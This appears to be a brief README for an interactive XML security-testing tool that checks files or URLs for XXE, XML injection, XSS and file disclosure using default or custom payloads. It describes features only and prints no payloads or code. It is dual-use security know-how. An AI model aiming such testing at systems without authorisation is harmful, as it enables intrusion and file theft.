# XML-Testing Automation
An interactive and flexible tool for penetration testing and bug bounty tasks focused on XML vulnerabilities, including XXE, XML Injection, XSS, and File Disclosure. The tool is user-friendly, with options to use default payloads or custom payloads provided via a file. Test files or URLs with real-time results and clear proofs of concept (PoC) for vulnerabilities.

# Features
XML Testing: Test for vulnerabilities such as:
XML External Entity (XXE) injection.
XML injection and malformed structures.
XSS and script injection.
Path traversal and file disclosure.
Payload Selection:
Use default payloads for quick testing.
Provide a custom payload file for advanced use cases.
Interactive Menu:
Test XML files or target URLs.
Easily navigate back to the main menu for repeated testing.
Real-time Results:
Displays well-formedness, vulnerability status, and PoC (if applicable).
Color-coded outputs for easy interpretation using colorama.
